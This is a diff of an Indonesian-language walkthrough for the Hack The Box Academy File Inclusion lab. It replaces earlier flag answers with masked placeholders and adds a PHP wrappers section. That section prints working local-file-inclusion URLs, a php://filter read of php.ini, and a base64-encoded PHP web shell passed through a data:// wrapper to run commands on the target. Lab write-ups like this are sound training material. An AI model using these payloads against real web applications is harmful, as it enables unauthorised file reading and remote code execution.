@@ -40,7 +40,7 @@ http://ip:port/index.php?language=../../../../usr/share/flags/flag.txt
 
 - **Answer**
 ```sh
-HTB{n3v3r_tru$t_u$3r_!nput}
+HTB{***}
 ```
 
 ## Basic Bypasses
@@ -67,7 +67,7 @@ http://ip:port/index.php?language=languages//....//....//....//....//flag.txt
 
 - **Answer**
 ```sh
-HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
+HTB{***}
 ```
 
 ## PHP Filters
@@ -113,5 +113,69 @@ echo 'code base64' | base64 -d
 
 - **Answer**
 ```sh
-HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}
+HTB{***}
+```
+
+## PHP Wrappers
+- Jalankan web target terlebih dahulu
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2018.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2019.JPG)
+
+- **Question:** Try to gain RCE using one of the PHP wrappers and read the flag at /
+- Buka URL berikut ini, untuk membuka isi file `php.ini`
+```sh
+http://ip:port/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2020.JPG)
+
+- Tekan `Ctrl+U` untuk membuka kode sumber halaman lalu copy seluruh isi code base64
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2021.JPG)
+
+- Tempel pada mousepad dan simpan dengan nama file `php-ini`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2022.JPG)
+
+- Decode melalui terminal dan cari konfigurasi `allow_url_include`
+```sh
+cat php-ini | base64 -d | grep 'allow_url_include'
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2023.JPG)
+
+- Karena `allow_url_include = On` sekarang kita bisa buat RCE. Decode source code RCE PHP menggunakan base64
+```sh
+echo '<?php system($_GET["cmd"]); ?>' | base64
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2024.JPG)
+
+- Copy base64 diatas lalu encode ke URL di https://www.urlencoder.org/
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2025.JPG)
+
+- Masukkan hasil encode diatas ke dalam URL jalankan melalui web target
+```sh
+http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2026.JPG)
+
+- Jika kita masukkan nilai parameter `cmd=ls /` maka disana terdapat file txt yang kemungkinan berisi flag
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2027.JPG)
+
+- Sekarang coba buka isi file tersebut menggunakan perintah `cat /nama_file` melalui URL
+```sh
+http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/nama_file
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2028.JPG)
+
+- **Answer**
+```sh
+HTB{***}
 ```
